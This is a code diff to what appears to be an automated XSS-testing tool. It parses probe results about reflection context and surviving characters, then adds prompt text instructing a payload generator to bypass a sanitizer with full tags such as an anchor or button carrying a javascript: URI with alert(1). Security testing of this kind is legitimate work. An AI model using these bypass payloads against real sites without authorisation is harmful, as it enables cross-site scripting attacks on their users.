@@ -92,14 +92,45 @@ def _extract_probe_context(context: ParsedContext) -> tuple[str, str, str]:
     context_type = ""
     surviving_chars = ""
 
+    # Prefer injectable SUBCONTEXT notes (structured JSON — avoids repr() escaping issues).
+    # A param may reflect in html_body (non-injectable) while a follow-up probe finds
+    # html_attr_url(href) as injectable — the injectable context must take priority.
+    subctx_prefix = "[probe:SUBCONTEXT] "
     for note in context.notes:
-        # e.g. "[probe:CONFIRMED] 'url' → html_attr_url(href) surviving='()/;`{}'"
-        m = re.search(r"\[probe:CONFIRMED\].*?→\s*(\w+)", note)
-        if m and not context_type:
-            context_type = m.group(1)
-        m2 = re.search(r"surviving='([^']*)'", note)
-        if m2 and not surviving_chars:
-            surviving_chars = m2.group(1)
+        if not note.startswith(subctx_prefix):
+            continue
+        try:
+            payload = json.loads(note[len(subctx_prefix):])
+        except Exception:
+            continue
+        if not isinstance(payload, dict):
+            continue
+        if not payload.get("is_injectable"):
+            continue
+        if not context_type:
+            context_type = str(payload.get("context_type") or "")
+        if not surviving_chars:
+            chars_list = payload.get("surviving_chars") or []
+            surviving_chars = "".join(sorted(str(c) for c in chars_list))
+
+    # Fall back: first CONFIRMED note (surviving chars are repr-encoded — parse conservatively)
+    if not context_type:
+        for note in context.notes:
+            m = re.search(r"\[probe:CONFIRMED\].*?→\s*(\w+)", note)
+            if m and not context_type:
+                context_type = m.group(1)
+        # surviving_chars fallback: re-read from SUBCONTEXT JSON for the chosen context
+        if context_type:
+            for note in context.notes:
+                if not note.startswith(subctx_prefix):
+                    continue
+                try:
+                    payload = json.loads(note[len(subctx_prefix):])
+                except Exception:
+                    continue
+                if str(payload.get("context_type") or "") == context_type and not surviving_chars:
+                    chars_list = payload.get("surviving_chars") or []
+                    surviving_chars = "".join(sorted(str(c) for c in chars_list))
 
     return sink_type, context_type, surviving_chars
 
@@ -754,6 +785,20 @@ def _application_signals_section(
         if outcomes:
             lines.append(f"Filter responses: {', '.join(outcomes)}")
 
+    # href/formaction bypass: when html_attr_url context has < surviving, the
+    # injection is in HTML body and needs a full <a href=javascript:> or
+    # <button formaction=javascript:> tag — NOT just a bare javascript: URI.
+    if context_type == "html_attr_url" and "<" in (surviving_chars or ""):
+        lines.append(
+            "INJECTION SHAPE: The parameter is reflected in the HTML BODY, not directly "
+            "inside an existing attribute. The sanitizer strips event handlers (onerror, "
+            "ontoggle, onload, etc.) but allows javascript: URIs in href/formaction. "
+            "INJECT A FULL TAG such as: "
+            '<a href="javascript:alert(1)">x</a> or '
+            '<button formaction="javascript:alert(1)">x</button>. '
+            "Do NOT inject a bare URI — it will render as plain text."
+        )
+
     section = "WHAT WE KNOW ABOUT THIS APPLICATION:\n"
     section += "\n".join(f"  {line}" for line in lines) + "\n"
 
@@ -971,6 +1016,15 @@ def _prompt_for_generation_phase(
         f"Reflection context: {context_type or 'unknown'}",
         f"Confirmed surviving special characters: {surviving_chars or '(none observed)'}",
     ]
+    # href bypass: injection is in HTML body — must inject a full tag, not a bare URI
+    if context_type == "html_attr_url" and "<" in (surviving_chars or ""):
+        probe_lines.append(
+            "INJECTION SHAPE: Parameter is in HTML BODY — inject a FULL TAG like "
+            '<a href="javascript:alert(1)">x</a> or '
+            '<button formaction="javascript:alert(1)">x</button>. '
+            "Event handlers (onerror/ontoggle/onload) are stripped. "
+            "Bare javascript: URIs render as plain text — always wrap in a tag."
+        )
     seed_section = _seed_examples_section(
         context_type=context_type,
         surviving_chars=surviving_chars,
